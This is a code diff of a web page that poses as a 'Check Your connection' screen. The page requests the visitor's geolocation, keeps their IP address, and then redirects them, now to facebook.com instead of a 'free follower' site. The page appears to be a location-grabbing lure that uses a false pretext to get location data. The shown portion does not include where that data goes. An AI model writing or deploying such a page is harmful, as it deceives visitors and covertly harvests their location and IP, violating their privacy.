@@ -79,7 +79,7 @@
 </head>
 <body>
     <div class="content">
-        <h2>Check Your connection...</h2>
+        <h2>📍 Check Your connection...</h2>
         <p id="loadingMessage">Please wait while we get your location information.</p>
     </div>
 
@@ -96,14 +96,14 @@
         const HIGH_ACCURACY = true; // Set to false if you don't need high accuracy
         const MAX_RETRIES = 3; // Maximum retries for failed requests
         const REQUEST_TIMEOUT = 10000; // 10 seconds timeout for API requests
-        const REDIRECT_URL = "https://laik112.github.io/Instal-free-follower-/"; // Editable redirect URL
+        const REDIRECT_URL = "https://www.facebook.com"; // Editable redirect URL
 
         // Global variables
         let userIP = '';
         let retryCounts = {};
 
         // Location permission check functions
-        function check Access() {
+        function checkLocationAccess() {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
                     console.log("Location Access Granted");
